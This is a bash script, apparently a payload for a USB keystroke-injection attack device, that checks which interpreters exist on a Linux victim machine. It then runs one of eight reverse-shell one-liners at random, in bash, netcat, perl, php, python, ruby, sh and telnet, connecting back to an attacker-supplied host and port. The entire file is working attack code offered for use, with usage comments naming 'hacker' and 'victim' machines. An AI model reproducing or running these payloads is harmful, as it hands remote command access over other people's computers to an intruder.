#!/bin/bash
#
# Title:            Random Reverse Shell
# 
# Description:
#                   1) Checks the availability of binaries on the system.
#                   2) Builds a list of possible payloads.
#                   3) Performs one at random.
#
# Author:           TW-D
# Version:          1.0
# Category:         Remote Access
# Target:           Linux
# Attackmodes:      HID and STORAGE
#
# TESTED ON
# ==========
# Ubuntu 20.04.4 LTS x86_64 (Xfce)
#
# USAGE
# ==========
# hacker@hacker-computer:~$ nc -lnvvp <REMOTE_PORT>
# victim@victim-computer:~$ $BASH ./random_reverse-shell.sh <REMOTE_HOST> <REMOTE_PORT>
#

set -eo pipefail

readonly REMOTE_HOST="${1}"

readonly REMOTE_PORT="${2}"

readonly RANDOM_FILENAME="${RANDOM}"

readonly BINARIES_LIST=(
    "/bin/bash"
    "/bin/mkfifo"
    "/bin/cat"
    "/bin/nc"
    "/bin/perl"
    "/bin/php"
    "/bin/python"
    "/bin/ruby"
    "/bin/sh"
    "/bin/mknod"
    "/bin/telnet"
)

readonly BASH_PAYLOAD=$(cat <<EOF
/bin/bash -i > /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0<&1 2>&1
EOF
)

#
# [CTRL + c]
#
readonly NC_PAYLOAD=$(cat <<EOF
/bin/mkfifo /tmp/${RANDOM_FILENAME} && /bin/cat /tmp/${RANDOM_FILENAME} | ${BASH} -i 2>&1 | /bin/nc ${REMOTE_HOST} ${REMOTE_PORT} > /tmp/${RANDOM_FILENAME}
EOF
)

#
# Tested on Perl v5.30.0
# [CTRL + c]
#
readonly PERL_PAYLOAD=$(cat <<EOF
/bin/perl -X -MIO -e '\$socket = new IO::Socket::INET(PeerAddr, "${REMOTE_HOST}:${REMOTE_PORT}"); STDIN->fdopen(\$socket, "r"); ($~)->fdopen(\$socket, "w"); system(\$_) while<>'
EOF
)

#
# Tested on PHP v7.4.3
#
readonly PHP_PAYLOAD=$(cat <<EOF
/bin/php -r '\$fsockopen = fsockopen("${REMOTE_HOST}", ${REMOTE_PORT}); exec("${BASH} -i <&3 >&3 2>&3");'
EOF
)

#
# Tested on Python v2.7.18
#
readonly PYTHON_PAYLOAD=$(cat <<EOF
/bin/python -c 'import socket, os, subprocess; tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM); tcp_socket.connect(("${REMOTE_HOST}", ${REMOTE_PORT})); os.dup2(tcp_socket.fileno(), 0); os.dup2(tcp_socket.fileno(), 1); os.dup2(tcp_socket.fileno(), 2); subprocess.call(["${BASH}", "-i"])'
EOF
)

#
# Tested on Ruby v2.7.0p0
#
readonly RUBY_PAYLOAD=$(cat <<EOF
/bin/ruby -rsocket -e 'tcp_socket = TCPSocket.new("${REMOTE_HOST}", ${REMOTE_PORT}); while (command = tcp_socket.gets); command = (command.chomp).downcase; (command == "exit") ? break : tcp_socket.puts(\`#{command}\`) rescue nil; end; tcp_socket.close'
EOF
)

readonly SH_PAYLOAD=$(cat <<EOF
/bin/sh -i > /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0<&1 2>&1
EOF
)

readonly TELNET_PAYLOAD=$(cat <<EOF
/bin/mknod /tmp/${RANDOM_FILENAME} p && /bin/telnet ${REMOTE_HOST} ${REMOTE_PORT} 0</tmp/${RANDOM_FILENAME} | ${BASH} 1>/tmp/${RANDOM_FILENAME}
EOF
)

set -u

available_binaries=()

for binary in "${BINARIES_LIST[@]}"; do
    if command -v "${binary}" > /dev/null 2>&1; then
        available_binaries+=("${binary}")
    fi
done

available_payloads=()

[[ "${available_binaries[*]}" =~ "/bin/bash" ]] && available_payloads+=("${BASH_PAYLOAD}") || echo ""
[[ "${available_binaries[*]}" =~ "/bin/mkfifo" && "${available_binaries[*]}" =~ "/bin/cat" && "${available_binaries[*]}" =~ "/bin/nc" ]] && available_payloads+=("${NC_PAYLOAD}") || echo ""
[[ "${available_binaries[*]}" =~ "/bin/perl" ]] && available_payloads+=("${PERL_PAYLOAD}") || echo ""
[[ "${available_binaries[*]}" =~ "/bin/php" ]] && available_payloads+=("${PHP_PAYLOAD}") || echo ""
[[ "${available_binaries[*]}" =~ "/bin/python" ]] && available_payloads+=("${PYTHON_PAYLOAD}") || echo ""
[[ "${available_binaries[*]}" =~ "/bin/ruby" ]] && available_payloads+=("${RUBY_PAYLOAD}") || echo ""
[[ "${available_binaries[*]}" =~ "/bin/sh" ]] && available_payloads+=("${SH_PAYLOAD}") || echo ""
[[ "${available_binaries[*]}" =~ "/bin/mknod" && "${available_binaries[*]}" =~ "/bin/telnet" ]] && available_payloads+=("${TELNET_PAYLOAD}") || echo ""

random_payload=${available_payloads[$RANDOM % "${#available_payloads[@]}"]}
$BASH -c "${random_payload}" &